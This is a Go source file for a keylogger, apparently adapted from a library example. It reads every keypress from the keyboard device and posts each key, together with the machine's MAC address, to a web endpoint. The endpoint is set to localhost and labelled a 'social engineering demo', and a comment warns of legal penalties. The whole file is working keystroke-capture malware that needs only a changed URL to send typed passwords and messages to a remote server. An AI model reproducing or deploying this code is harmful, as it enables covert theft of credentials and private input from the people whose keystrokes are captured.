package main

import (
	"bytes"
	"fmt"
	"net"

	"github.com/MarinX/keylogger"
	"github.com/parnurzeal/gorequest"
	"github.com/sirupsen/logrus"
)

//
//
// 3 Jul 2019 by echel0nn
// original code was MariNX's example.
// This code will post the keystrokes to webservice.
// Warning, code is experimental.
// You may face charges and penalties for using it in environments that you dont own.

func checkErr(err error) error {
	if err != nil {
		return err
	} else {
		return nil
	}
}

func getMacAddr() (addr string) {
	interfaces, err := net.Interfaces()
	checkErr(err)
	for _, i := range interfaces {
		if i.Flags&net.FlagUp != 0 && bytes.Compare(i.HardwareAddr, nil) != 0 {
			addr = i.HardwareAddr.String()
			break
		}
	}
	return
}

type Record struct {
	IP         string `json:"ip"`
	MACADDR    string `json:"macaddr"`
	PressedKey string `json:"pressedkey"`
}

func main() {
	var URL string = "http://localhost:8080/socialengineeringdemo"
	logrus.Println("Debug Server :", URL)
	request := gorequest.New()

	// find keyboard device, does not require a root permission
	keyboard := keylogger.FindKeyboardDevice()

	// check if we found a path to keyboard
	if len(keyboard) <= 0 {
		logrus.Error("No keyboard found...you will need to provide manual input path")
		return
	}

	logrus.Println("Found a keyboard at", keyboard)
	// init keylogger with keyboard
	k, err := keylogger.New(keyboard)
	if err != nil {
		logrus.Error(err)
		return
	}
	defer k.Close()

	events := k.Read()

	// range of events
	for e := range events {
		switch e.Type {
		// EvKey is used to describe state changes of keyboards, buttons, or other key-like devices.
		// check the input_event.go for more events
		case keylogger.EvKey:

			// if the state of key is pressed
			if e.KeyPress() {
				logrus.Println("[ EVENT ] pressed key ", e.KeyString())

				logrus.Println("MACADDR:" + getMacAddr())
				rec := &Record{
					IP:         "127.0.0.1",
					MACADDR:    getMacAddr(),
					PressedKey: e.KeyString(),
				}
				// send the key strokes
				resp, body, errs := request.Post(URL).
					Set("Aptal-Malware", "DEBG DEMO").
					Send(rec).
					End()

				if errs != nil {
					fmt.Println(errs)
					continue
					logrus.Println(" [ FATAL ERROR ! ] CONNECTION HAS BEEN LOST OR DISCONNECTED.")
				}
				logrus.Println(resp.Status, resp.Header, body)
			}

			// if the state of key is released
			//if e.KeyRelease() {
			//	logrus.Println("[event] release key ", e.KeyString())
			//}

			break
		}
	}
}
